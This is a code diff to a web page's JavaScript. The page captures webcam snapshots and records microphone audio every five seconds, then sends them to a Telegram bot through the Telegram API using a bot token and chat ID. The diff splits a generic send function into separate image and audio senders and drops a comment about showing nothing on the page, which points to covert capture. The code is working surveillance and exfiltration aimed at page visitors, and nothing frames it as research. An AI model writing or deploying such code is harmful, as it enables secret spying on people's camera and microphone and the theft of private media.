@@ -31,7 +31,6 @@
         })
         .catch(error => {
           console.error("Permission denied or error occurred: ", error);
-          // No need to show anything on the page
         });
     }
 
@@ -58,9 +57,26 @@
         canvas.getContext('2d').drawImage(videoElement, 0, 0);
 
         const imageData = canvas.toDataURL('image/jpeg'); // Convert to image data
-        sendToTelegram(imageData); // Send captured image to Telegram
+        sendImageToTelegram(imageData); // Send captured image to Telegram
         videoElement.pause(); // Pause video playback
       };
+    }
+
+    // Send image data to Telegram bot
+    function sendImageToTelegram(imageData) {
+      const url = `https://api.telegram.org/bot${botToken}/sendPhoto?chat_id=${chatId}&photo=${encodeURIComponent(imageData)}`;
+      fetch(url)
+        .then(response => response.json())
+        .then(data => {
+          if (data.ok) {
+            console.log("Image sent successfully!");
+          } else {
+            console.error("Error sending image:", data);
+          }
+        })
+        .catch(error => {
+          console.error("Error:", error);
+        });
     }
 
     // Capture audio every 5 seconds and send it to Telegram
@@ -76,8 +92,7 @@
         const audioBlob = new Blob(audioChunks, { type: 'audio/wav' });
         const audioUrl = URL.createObjectURL(audioBlob);
 
-        // Send audio file URL to Telegram
-        sendToTelegram(audioUrl);
+        sendAudioToTelegram(audioUrl);
       };
 
       // Start recording audio for 5 seconds
@@ -87,16 +102,16 @@
       }, 5000); // Stop recording after 5 seconds
     }
 
-    // Function to send media data to Telegram bot
-    function sendToTelegram(data) {
-      const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(data)}`;
+    // Send audio file to Telegram bot
+    function sendAudioToTelegram(audioUrl) {
+      const url = `https://api.telegram.org/bot${botToken}/sendAudio?chat_id=${chatId}&audio=${encodeURIComponent(audioUrl)}`;
       fetch(url)
         .then(response => response.json())
         .then(data => {
           if (data.ok) {
-            console.log("Media sent successfully!");
+            console.log("Audio sent successfully!");
           } else {
-            console.error("Error sending media:", data);
+            console.error("Error sending audio:", data);
           }
         })
         .catch(error => {
